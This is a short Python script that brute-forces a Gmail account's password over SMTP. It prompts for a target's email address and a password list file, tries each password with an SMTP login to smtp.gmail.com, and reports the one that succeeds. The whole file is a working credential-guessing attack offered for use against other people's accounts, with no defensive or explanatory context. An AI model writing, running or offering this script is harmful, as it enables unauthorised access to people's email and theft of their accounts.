import smtplib
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = input("Enter target's email address: ")
passwordfile = input("Enter the path to the passwordfile: ")
#the path can be found by just dragging and dropping the file to your terminal
file = open(passwordfile, "r")

for password in file:
	password = password.strip("\n")
	try:
		#tries to login using email and password given
		smtpserver.login(user, password)
		print(colored("Password found: %s" %password, 'green'))
		break
	except smtplib.SMTPAuthenticationError:
		print(colored("Wrong password: " + password, 'red'))